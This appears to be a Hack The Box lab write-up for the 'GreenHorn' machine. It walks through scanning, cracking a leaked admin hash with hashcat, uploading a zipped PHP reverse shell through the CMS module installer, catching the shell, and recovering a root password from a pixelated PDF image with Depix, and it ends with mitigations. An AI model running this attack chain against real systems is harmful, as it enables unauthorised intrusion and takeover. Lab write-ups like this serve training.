# GreenHorn - Ashbo3n

**Machine Name:** GreenHorn

**Rating:** 2.9

**Area Of Interest:** <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Remote File Inclusion, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Weak Credentials, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Remote Code Execution, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Information Disclosure</span>

## <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Initial Shell - Weak Creds</span>

<span class="chip__text htb-body-md htb-text-primary htb-font-medium">**Nmap:**</span>

```bash
└─# cat nmap                                                                                                                                                                                                                                                                                                               
# Nmap 7.95 scan initiated Mon Jan 12 05:01:17 2026 as: /usr/lib/nmap/nmap -p- -sVC -oN nmap --min-rate=5000 -vv 10.129.231.80                                                                                                                                                                                             
Nmap scan report for 10.129.231.80                                                                                                                                                                                                                                                                                         
Host is up, received echo-reply ttl 63 (0.23s latency).                                                                                                                                                                                                                                                                    
Scanned at 2026-01-12 05:01:17 IST for 55s                                                                                                                                                                                                                                                                                 
Not shown: 65532 closed tcp ports (reset)                                                                                                                                                                                                                                                                                  
PORT     STATE SERVICE REASON         VERSION                                                                                                                                                                                                                                                                              
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)                                                                                                                                                                                                                        
| ssh-hostkey:                                                                                                                                                                                                                                                                                                             
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)                                                                                                                                                                                                                                                            
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOp+cK9ugCW282Gw6Rqe+Yz+5fOGcZzYi8cmlGmFdFAjI1347tnkKumDGK1qJnJ1hj68bmzOONz/x1CMeZjnKMw=                                                                          
|   256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)                                                                                                                                                                                                             
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZQbCc8u6r2CVboxEesTZTMmZnMuEidK9zNjkD2RGEv                                                                                                                                                          
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)                                                                                                                                                                                 
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                                                                                                                                                 
| http-methods:                                                                                                                                                                                                                             
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                                                                
|_http-title: Did not follow redirect to http://greenhorn.htb/                                                                                                                                                                              
3000/tcp open  http    syn-ack ttl 63 Golang net/http server                                                                                                                                                                                
|_http-title: GreenHorn                                                                                                                                                                                                                                                       
| http-methods:                                                                                                                                                                                                                             
|_  Supported Methods: HEAD GET                                                                                                                                                                                                             
| fingerprint-strings:                                                                                                                                                                                                                      
|   GenericLines, Help, RTSPRequest:                                                                                                                                                                                                        
|     HTTP/1.1 400 Bad Request                                                                                                                                                                                                              
|     Content-Type: text/plain; charset=utf-8                                                                                                                                                                                               
|     Connection: close                                                                                                                                                                                                                     
|     Request                                                                                                                                                                                                                               
|   GetRequest:                                                                                                                                                                                                                             
|     HTTP/1.0 200 OK                                                                                                                                                                                                                       
|     Cache-Control: max-age=0, private, must-revalidate, no-transform                                                                                                                                                                      
|     Content-Type: text/html; charset=utf-8                                                                                                                                                                                                                                                                               
|     Set-Cookie: i_like_gitea=3f29b0268c063480; Path=/; HttpOnly; SameSite=Lax                                                                                                                                                             
|     Set-Cookie: _csrf=RrPl-nlKt5LbBXWUjmfYWLzJHWA6MTc2ODE3NDI2OTgwOTcyMTc1Mw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax                                                                                                               
|     X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                           
|     Date: Sun, 11 Jan 2026 23:31:09 GMT                                                                                                                                                                                                   
|                                                                                                                                                                                                                            
|     <html lang="en-US" class="theme-auto">                                                                                                                                                                                                
|     <head>                                                                                                                                                                                                                                
|     <meta name="viewport" content="width=device-width, initial-scale=1">                                                                                                                                                                  
|     <title>GreenHorn</title>                                                                                                                                                                                                                                                                                                                                                            
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX                                                                                                                 
|   HTTPOptions:                                                                                                                                                                                                                            
|     HTTP/1.0 405 Method Not Allowed                                                                                                                                                                                                       
|     Allow: HEAD                                                                                                                                                                                                                           
|     Allow: HEAD                                                                                                                                                                                                                           
|     Allow: GET                                                                                                                                                                                                                            
|     Cache-Control: max-age=0, private, must-revalidate, no-transform                                                                                                                                                                      
|     Set-Cookie: i_like_gitea=281c8d2fe0b6a2c7; Path=/; HttpOnly; SameSite=Lax                                                                                                                                                             
|     Set-Cookie: _csrf=bpYlyQ0bCIt9roAqi_jT2Eea1eg6MTc2ODE3NDI3MDc3OTg2NDAzMg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax                                                                                                               
|     X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                           
|     Date: Sun, 11 Jan 2026 23:31:10 GMT                                                                                                                                                                                                   
|_    Content-Length: 0                                                                                                                                                                                                                     
|_http-favicon: Unknown favicon MD5: F6E1A9128148EEAD9EFF823C540EF471                                                                                                                                                                       
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=1/12%Time=696432DA%P=x86_64-pc-linux-gnu%r(Ge                                                             
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t                                                             
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x                                                             
SF:20Request")%r(GetRequest,2A8C,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:                                            
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConte                                            
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=                                                                                                                                                                  
SF:3f29b0268c063480;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie                                                             
SF::\x20_csrf=RrPl-nlKt5LbBXWUjmfYWLzJHWA6MTc2ODE3NDI2OTgwOTcyMTc1Mw;\x20P                                                             
SF:ath=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Option                                                             
SF:s:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2011\x20Jan\x202026\x2023:31:09\x20G                                                                                   
SF:MT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-                                                                                   
SF:auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=device                                                                                   
SF:-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\x20r                                                                                   
SF:el=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR3Jl                                                                                   
SF:ZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9                                                                                   
SF:ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm                                                                                   
SF:4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJza                                                                                   
SF:XplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX")                                                                                   
SF:%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text                                                                                   
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R                                                                                   
SF:equest")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowe                                                                                                                   
SF:d\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control                                                                                                                   
SF::\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-                                                                                                                   
SF:Cookie:\x20i_like_gitea=281c8d2fe0b6a2c7;\x20Path=/;\x20HttpOnly;\x20Sa                                                                                                                   
SF:meSite=Lax\r\nSet-Cookie:\x20_csrf=bpYlyQ0bCIt9roAqi_jT2Eea1eg6MTc2ODE3                                                                                                                   
SF:NDI3MDc3OTg2NDAzMg;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSi                                                                                                                   
SF:te=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2011\x20Jan\                                                                                                                   
SF:x202026\x2023:31:10\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ                                                                                                                   
SF:est,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla                                                                                                                   
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque                     
SF:st");                                                                                      
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                               
                                                                                              
Read data files from: /usr/share/nmap                                                                                                                                                        
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                               
# Nmap done at Mon Jan 12 05:02:12 2026 -- 1 IP address (1 host up) scanned in 55.20 seconds
                                                                                              
┌──(root㉿kali)-[~/HTB/GreenHorn]                                                             
└─#                                                                                                                   


```

Add `greenhorn.htb` to your /etc/hosts file, we don't have DNS that is why our browser will search our hosts file for this domain so we need this domain in our hosts file.

**Ports Notice:** 22, 80, 3000, we will: 80 -&gt; 3000 -&gt; 22 (we are enumerating 22 at last because in most cases in easy level Machine that SSH is not where we mostly get our initial shell is from, and we can't get most info from ssh anyway (it will take time))

Moving to port 3000:

Going to [http://greenhorn.htb:3000/](http://greenhorn.htb:3000/) A gitea page appeared with Version: 1.21.11 listed on it, as my primal instinct i searched online for its vulnerabilities but this one is quite a recent one so no vulnerabilities was useful for this one, so i moved on to check what page is hosted on [http://greenhorn.htb/](http://greenhorn.htb/) and THE URLS Noted:

- [http://greenhorn.htb/?file=welcome-to-greenhorn](http://greenhorn.htb/?file=welcome-to-greenhorn) - A welcome page.
- [http://greenhorn.htb/login.php](http://greenhorn.htb/login.php) - A login page
- [http://greenhorn.htb/admin.php](http://greenhorn.htb/admin.php) - A Admin Page However redirects to login.php when not logged in
- [http://greenhorn.htb/README.md](http://greenhorn.htb/README.md) - A Readme file, which has no useful info
- [http://greenhorn.htb/install.php](http://greenhorn.htb/install.php) - Redirects to Login
- [http://greenhorn.htb/robots.txt](http://greenhorn.htb/robots.txt) - Disallows /data and /docs

**For port 3000 Enumeration**

Returning to [http://greenhorn.htb:3000/](http://greenhorn.htb:3000/) I logged in via register account and then explored [http://greenhorn.htb:3000/explore/repos](http://greenhorn.htb:3000/explore/repos) and found **exposed** source code: [http://greenhorn.htb:3000/GreenAdmin/GreenHorn](http://greenhorn.htb:3000/GreenAdmin/GreenHorn)

Download it via git clone and This is the structure:

```bash
┌──(root㉿kali)-[~/HTB/GreenHorn/Git_Source/GreenHorn]
└─# ls        
admin.php  data  docs  files  images  index.php  install.php  login.php  README.md  requirements.php  robots.txt  SECURITY.md
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/HTB/GreenHorn/Git_Source/GreenHorn]
└─# 

```

Put it into a hash.txt:

```bash
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/HTB/GreenHorn/Hash]                                                                                                                                                                                                      
└─# hashcat -m 1700 hash.txt ~/wordlist/rockyou.txt -w 3                                                                                                                                                                                    
hashcat (v6.2.6) starting                                                                                                                                                                                                                   
                                                                                                                                                                                                                                            
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]                                                                                        
====================================================================================================================================================                                                                                        
* Device #1: cpu-haswell-13th Gen Intel(R) Core(TM) i5-13420H, 2557/5179 MB (1024 MB allocatable), 5MCU                                                                                                                                     
                                                                                                                                                                                                                                            
Minimum password length supported by kernel: 0                                                                                                                                                                                              
Maximum password length supported by kernel: 256                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Hashes: 1 digests; 1 unique digests, 1 unique salts                                                                                                                                                                                         
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                                                                                                                                                                
Rules: 1                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
Optimizers applied:                                                                                                                                                                                                                         
* Zero-Byte                                                                                                                                                                                                                                 
* Early-Skip                                                                                                                                                                                                                                
* Not-Salted                                                                                                                                                                                                                                
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /root/wordlist/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385
<SNIP.....>
```

Hash cracked!

```bash
┌──(root㉿kali)-[~/HTB/GreenHorn/Hash]
└─# hashcat -m 1700 hash.txt --show                     
d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:redacted
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/HTB/GreenHorn/Hash]
└─# 

```

On [http://greenhorn.htb/login.php](http://greenhorn.htb/login.php) Login with the given password.

Download penetester money php reverse shell file and set things there, like LHOST AND LPORT then zip it, i named it heaven.zip:

```bash
                                                                                                                                                                                                                                           
┌──(env)─(root㉿kali)-[~/HTB/GreenHorn/Exploit]
└─# zip Heaven.zip Heaven.php 
  adding: Heaven.php (deflated 60%)
          
```

Start your nc listern on the port you entered on the .php rev file and upload it to [http://greenhorn.htb/admin.php?action=installmodule](http://greenhorn.htb/admin.php?action=installmodule) and you should get a shell:

```bash
┌──(root㉿kali)-[~/HTB/GreenHorn/Exploit]
└─# penelope 
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.0.2.15 • 172.17.0.1 • 10.10.15.197
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from greenhorn~10.129.35.68-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /root/.penelope/sessions/greenhorn~10.129.35.68-Linux-x86_64/2026_01_12-23_20_31-535.log 📜
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Got reverse shell from greenhorn~10.129.35.68-Linux-x86_64 😍 Assigned SessionID <2>
www-data@greenhorn:/$ ls
bin  boot  cdrom  data  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
www-data@greenhorn:/$ cd ~/
www-data@greenhorn:~$ ls
html
www-data@greenhorn:~$ 

```

 On viewing /etc/passwd we do see some users:

```bash
git:x:114:120:Git Version Control,,,:/home/git:/bin/bash
mysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false
junior:x:1000:1000::/home/junior:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false

```

Lets try to su using these usernames and with the found we found earlier

Success:

```bash
www-data@greenhorn:~$ su - junior
Password: 
junior@greenhorn:~$ cat user.txt
Redacted!
junior@greenhorn:~$ 

```

Found a .pdf in the home dir with this content:

```
Hello junior,
We have recently installed OpenVAS on our server to actively monitor and identify potential security
vulnerabilities. Currently, only the root user, represented by myself, has the authorization to execute
OpenVAS using the following command:
`sudo /usr/sbin/openvas`
Enter password: <Pixelated Password Image>
As part of your familiarization with this tool, we encourage you to learn how to use OpenVAS
effectively. In the future, you will also have the capability to run OpenVAS by entering the same
command and providing your password when prompted.
Feel free to reach out if you have any questions or need further assistance.
Have a great week,
Mr. Green
```

So i opened it via xdg and saved the pixelated img and found this tool: [https://github.com/spipm/Depixelization\_poc](https://github.com/spipm/Depixelization_poc)

**Example Usage:**

```python
python3 depix.py \
    -p images/testimages/testimage3_pixels.png \
    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
```

**Result:**

```
┌──(root㉿kali)-[~/HTB/GreenHorn/Depixelization_poc]
└─# python3 depix.py \
    -p /root/HTB/GreenHorn/Root_Exploitation/Pixel.png \ 
    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
    -o /root/HTB/GreenHorn/Depixel.png
2026-01-12 23:53:40,409 - Loading pixelated image from /root/HTB/GreenHorn/Root_Exploitation/Pixel.png
2026-01-12 23:53:40,422 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2026-01-12 23:53:40,874 - Finding color rectangles from pixelated space
2026-01-12 23:53:40,875 - Found 252 same color rectangles
2026-01-12 23:53:40,875 - 190 rectangles left after moot filter
2026-01-12 23:53:40,875 - Found 1 different rectangle sizes
2026-01-12 23:53:40,875 - Finding matches in search image
2026-01-12 23:53:40,875 - Scanning 190 blocks with size (5, 5)
2026-01-12 23:53:40,894 - Scanning in searchImage: 0/1674
2026-01-12 23:54:11,721 - Removing blocks with no matches
2026-01-12 23:54:11,722 - Splitting single matches and multiple matches
2026-01-12 23:54:11,725 - [16 straight matches | 174 multiple matches]
2026-01-12 23:54:11,725 - Trying geometrical matches on single-match squares
2026-01-12 23:54:11,933 - [29 straight matches | 161 multiple matches]
2026-01-12 23:54:11,934 - Trying another pass on geometrical matches
2026-01-12 23:54:12,119 - [41 straight matches | 149 multiple matches]
2026-01-12 23:54:12,119 - Writing single match results to output
2026-01-12 23:54:12,120 - Writing average results for multiple matches to output
2026-01-12 23:54:13,824 - Saving output image to: /root/HTB/GreenHorn/Depixel.png
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/HTB/GreenHorn/Depixelization_poc]
└─# 

```

Let's get root

```
junior@greenhorn:~$ sudo su
[sudo] password for junior: 
Sorry, try again.
[sudo] password for junior: 
Sorry, try again.
[sudo] password for junior: 
sudo: 3 incorrect password attempts
junior@greenhorn:~$ su -
Password: 
root@greenhorn:~# cat roo.txt
cat: roo.txt: No such file or directory
root@greenhorn:~# cd /root
root@greenhorn:~# cat root.txt
Redacted
root@greenhorn:~# 
```

Root flag Owned, Objective Achieved.

## Mitigations

#### 1. Enforce Strong Password Policies and Multi-Factor Authentication (MFA)

<span data-path-to-node="3,1"><span class="citation-50">The initial compromise was facilitated by cracking a weak password (</span>**<span class="citation-50">iloveyou1</span>**<span class="citation-50">) used by the </span>`<span class="citation-50">junior</span>`<span class="citation-50"> user. </span></span><span data-path-to-node="3,2"><span class="citation-50 citation-end-50"><sup class="superscript" data-turn-source-index="2"></sup><sup class="superscript" data-turn-source-index="2"></sup><sup class="superscript" data-turn-source-index="2"></sup></span></span><span data-path-to-node="3,4"><span class="citation-49">Implementing a robust password policy that requires a minimum length (e.g., 14+ characters) and a mix of character types (uppercase, lowercase, numbers, and symbols) would make offline brute-force attacks via tools like Hashcat significantly more difficult. </span></span><span data-path-to-node="3,5"><span class="citation-49 citation-end-49"><sup class="superscript" data-turn-source-index="3"></sup><sup class="superscript" data-turn-source-index="3"></sup><sup class="superscript" data-turn-source-index="3"></sup><sup class="superscript" data-turn-source-index="3"></sup></span></span><span data-path-to-node="3,7"><span class="citation-48">Furthermore, deploying </span>**<span class="citation-48">Multi-Factor Authentication (MFA)</span>**<span class="citation-48"> for all external and internal services (SSH and Gitea) would prevent unauthorized access even if credentials are leaked or cracked.</span></span>

#### 2. Secure Source Code and Sensitive Information

<span data-path-to-node="5,1"><span class="citation-47">The attacker gained critical insights and potential credentials by accessing exposed source code on the Gitea instance. </span></span><span data-path-to-node="5,2"><span class="citation-47 citation-end-47"><sup class="superscript" data-turn-source-index="5"></sup></span></span><span data-path-to-node="5,4"><span class="citation-46">Organizations should ensure that repositories do not contain hardcoded secrets, configuration files with sensitive data, or internal documentation that reveals system architecture. </span></span><span data-path-to-node="5,5"><span class="citation-46 citation-end-46"><sup class="superscript" data-turn-source-index="6"></sup><sup class="superscript" data-turn-source-index="6"></sup><sup class="superscript" data-turn-source-index="6"></sup><sup class="superscript" data-turn-source-index="6"></sup></span></span><span data-path-to-node="5,7"><span class="citation-45">Additionally, access to internal development tools like Gitea should be restricted to authorized personnel via </span>**<span class="citation-45">IP whitelisting</span>**<span class="citation-45"> or </span>**<span class="citation-45">VPNs</span>**<span class="citation-45"> to prevent external enumeration by unauthorized actors.</span></span>

#### 3. Mitigate Information Disclosure in Documents

<span data-path-to-node="7,1"><span class="citation-44">The privilege escalation to root was made possible by a PDF file in the user's home directory that contained a pixelated image of a password. </span></span><span data-path-to-node="7,2"><span class="citation-44 citation-end-44"><sup class="superscript" data-turn-source-index="8"></sup><sup class="superscript" data-turn-source-index="8"></sup><sup class="superscript" data-turn-source-index="8"></sup><sup class="superscript" data-turn-source-index="8"></sup></span></span><span data-path-to-node="7,4"><span class="citation-43">Using pixelation (mosaic) is an insecure method of redaction because tools like </span>**<span class="citation-43">Depix</span>**<span class="citation-43"> can reconstruct the original text. </span></span><span data-path-to-node="7,5"><span class="citation-43 citation-end-43"><sup class="superscript" data-turn-source-index="9"></sup><sup class="superscript" data-turn-source-index="9"></sup><sup class="superscript" data-turn-source-index="9"></sup><sup class="superscript" data-turn-source-index="9"></sup></span></span><span data-path-to-node="7,7"><span class="citation-42">All sensitive information in shared or stored documents should be redacted by </span>**<span class="citation-42">completely obscuring the text</span>**<span class="citation-42"> with solid black bars or removing the sensitive content entirely before the document is finalized and distributed.</span></span>

### <span data-path-to-node="7,7"><span class="citation-42">Summary of Mitigations</span></span>

<table data-path-to-node="10" id="bkmrk-vulnerability-catego" style="margin-bottom: 32px; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; width: 100%; height: 180.8px;"><thead style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; height: 45.2px;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; width: 15.1607%; height: 45.2px;">**vulnerability Category**</td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; width: 40.1865%; height: 45.2px;">**Observed Exploit**</td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; width: 44.5337%; height: 45.2px;">**Mitigation Strategy**</td></tr></thead><tbody style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important;"><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; height: 45.2px;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; width: 15.1607%; height: 45.2px;">Identity &amp; Access</td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; width: 40.1865%; height: 45.2px;"><span class="citation-41">Weak user password (</span>**<span class="citation-41">iloveyou1</span>**<span class="citation-41">) cracked via Hashcat. </span></td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; width: 44.5337%; height: 45.2px;">Implement strong password complexity and Multi-Factor Authentication (MFA).</td></tr><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; height: 45.2px;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; width: 15.1607%; height: 45.2px;">Information Disclosure</td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; width: 40.1865%; height: 45.2px;">Source code and internal files exposed on Gitea (Port 3000).</td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; width: 44.5337%; height: 45.2px;">Sanitize repositories for secrets; restrict Gitea access to internal networks.</td></tr><tr style="font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; height: 45.2px;"><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; width: 15.1607%; height: 45.2px;">Insecure Redaction</td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; width: 40.1865%; height: 45.2px;">Root password recovered from a pixelated image in a PDF using Depix.</td><td style="border: 1px solid; font-family: Google Sans Text, sans-serif !important; line-height: 1.15 !important; margin-top: 0px !important; width: 44.5337%; height: 45.2px;">Use solid-color redaction or permanent text removal instead of pixelation/blurring.</td></tr></tbody></table>